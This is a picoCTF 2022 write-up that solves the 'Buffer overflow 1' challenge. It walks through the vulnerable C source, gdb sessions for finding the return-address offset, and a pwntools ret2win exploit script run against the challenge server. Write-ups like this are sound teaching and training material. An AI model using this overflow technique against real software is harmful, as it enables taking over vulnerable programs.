---
title: "pico22/pwn: Buffer overflow 1"
date: 2022-04-05 14:56:22
tags:
- ctf
- pico22
- pwn
description: "Writeup for the picoCTF 2022 pwn challenge [Buffer overflow 1]."
permalink: ctfs/pico22/pwn/buffer-overflow-1/
---
## 📜 Description

Control the return address \
Now we're cooking! You can overflow the buffer and return to the flag function in the program. \
You can view source here. And connect with it using `nc saturn.picoctf.net 61265`

---

## 🔍 Detailed Solution

Let's check out our source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

In the `vuln()` function, we see that the `gets()` function is being used. If you're new to binary exploitation, `gets()` is imfamous for being able to store more input than allocated, overflowing the buffer and writing onto the "stack". Because of this, we are able to write our own addresses onto the stack and change the return address to `win()`.

To start, we first need to figure out our "offset". The offset is just the distance between the beginning of the buffer and the position of the address we need to overwrite. Since this binary is in x32, the address will be stored in the `$eip` register. This can be visualized with the `gdb` utility:

```text
gef➤  b main
Breakpoint 1 at 0x80492d7
gef➤  r
Starting program: /home/kali/pico22/buffer-overflow-1/vuln 

Breakpoint 1, 0x080492d7 in main ()
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xf7fa89e8  →  0xffffd1cc  →  0xffffd39c  →  "SHELL=/usr/bin/bash"
$ebx   : 0x0       
$ecx   : 0xffffd120  →  0x00000001
$edx   : 0xffffd154  →  0x00000000
$esp   : 0xffffd100  →  0xffffd120  →  0x00000001
$ebp   : 0xffffd108  →  0x00000000
$esi   : 0x1       
$edi   : 0x80490e0  →  <_start+0> endbr32 
$eip   : 0x80492d7  →  <main+19> sub esp, 0x10
...
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80492d3 <main+15>        mov    ebp, esp
    0x80492d5 <main+17>        push   ebx
    0x80492d6 <main+18>        push   ecx
 →  0x80492d7 <main+19>        sub    esp, 0x10
    0x80492da <main+22>        call   0x8049130 <__x86.get_pc_thunk.bx>
    0x80492df <main+27>        add    ebx, 0x2d21
    0x80492e5 <main+33>        mov    eax, DWORD PTR [ebx-0x4]
    0x80492eb <main+39>        mov    eax, DWORD PTR [eax]
    0x80492ed <main+41>        push   0x0
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x80492d7 in main (), reason: BREAKPOINT
```

Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). We can overflow this register by passing in a bunch of `A`s into the code. Let's try it:

```text
gef➤  r
Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x41      
$edx   : 0xffffffff
$esp   : 0xffffd0f0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x1       
$edi   : 0x80490e0  →  <_start+0> endbr32 
$eip   : 0x41414141 ("AAAA"?)
...
─────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x41414141 in ?? (), reason: SIGSEGV
```

Look what happened: all of our registers just got overflowed with our `A`s in ASCII (`0x41` = `A`), including the `$eip`! However, we don't know **how many** `A`s we need to pass in order to reach the `$eip`. To solve this problem, we can use the pwntools `cyclic` command. This creates a recognizable cycling pattern for it to identify:

```text
gef➤  shell cyclic 150
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
gef➤  r
Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x41      
$edx   : 0xffffffff
$esp   : 0xffffd0f0  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x1       
$edi   : 0x80490e0  →  <_start+0> endbr32 
$eip   : 0x6161616c ("laaa"?)
...
─────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
```

We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:

```text
gef➤  pattern search 0x6161616c
[+] Searching for '0x6161616c'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search)
```

To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:

```text
kali@kali:~/pico22/buffer-overflow-1$ readelf -h vuln | grep endian
  Data:                              2's complement, little endian
```

Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the function we need to jump to in order to get the flag. This would be `win()`:

```text
gef➤  x win
0x80491f6 <win>: 0xfb1e0ff3
```

Win is at `0x80491f6`. We can now make a simple exploit that connects to the server and prints the flag using Python and pwntools:

```py
from pwn import *
payload = b"A"*44 + p32(0x80491f6)        # The p32 function prints this address as little endian (b'\xf6\x91\x04\x08').
host, port = "saturn.picoctf.net", [PORT_REDACTED]

p = remote(host, port)                    # Opens the connection
log.info(p.readS())                       # Decodes/prints "Please enter your string:"
p.sendline(payload)                       # Sends the payload
log.success(p.readallS())                 # Decodes/prints all program outputs
p.close()                                 # Closes the connection
```

Let's try running the script on the server:

```text
kali@kali:~/pico22/buffer-overflow-1$ python3 exp2.py
[+] Opening connection to saturn.picoctf.net on port [PORT_REDACTED]: Done
[*] Please enter your string: 
[+] Receiving all data: Done (100B)
[*] Closed connection to saturn.picoctf.net port [PORT_REDACTED]
[+] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_********}
```

You have completed your first `ret2win` buffer overflow on a x32 binary!
